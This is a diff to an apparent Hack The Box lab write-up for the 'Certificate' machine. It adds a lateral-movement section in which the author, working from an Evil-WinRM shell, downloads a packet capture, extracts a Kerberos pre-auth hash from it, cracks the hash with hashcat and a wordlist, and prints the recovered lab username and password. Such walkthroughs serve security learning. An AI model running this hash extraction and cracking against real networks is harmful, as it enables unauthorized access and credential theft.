@@ -385,6 +385,10 @@ certificate\sara.b
 
 ## 4. Lateral movement
 
+### 4.1. pcap file for WS-01
+
+Some working files were found in Sara's documents:
+
 ```pwsh
 *Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-ChildItem -Recurse
 
@@ -406,12 +410,63 @@ Mode                LastWriteTime         Length Name
 -a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
 ```
 
+The `Description.txt` convenient hints that some credentials may be lying around:
+
 ```pwsh
 *Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-Content WS-01\Description.txt
 The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
 When a user tries to input bad credentials, it returns bad credentials error.
 But when a user provides valid credentials the file explorer freezes and then crashes!
 ```
+
+Download and review the pcap file:
+
+```pwsh
+*Evil-WinRM* PS C:\Users\Sara.B\Documents> download WS-01/WS-01_PktMon.pcap
+
+Info: Downloading C:\Users\Sara.B\Documents\WS-01/WS-01_PktMon.pcap to WS-01_PktMon.pcap
+
+Info: Download successful!
+```
+
+Some kerberos packets involving `WS-01` is found in the pcap file:
+
+![](https://github.com/user-attachments/assets/ef40cb5e-baca-41aa-80fd-a6854510134f)
+
+### 4.2. Extracting Kerberos credentials from PCAP
+
+Googling returns a useful utility on GitHub to that parses Kerberos packets from pcap files to extract `AS-REQ`, `AS-REP` and `TGS-REP` hashes: [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)
+
+```console
+root@kali:~/Krb5RoastParser# python krb5_roast_parser.py ../WS-01_PktMon.pcap as_req | tee ws-01-hash.txt
+$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
+```
+
+Cracking the password hash with hashcat
+
+```console
+root@kali:~# hashcat ws-01-hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+⋮
+
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
+⋮
+
+$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
+Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
+⋮
+```
+
+Credentials found:
+- username: `Lion.SK`
+- password: `!QAZ2wsx`
 
 ## to be updated
 
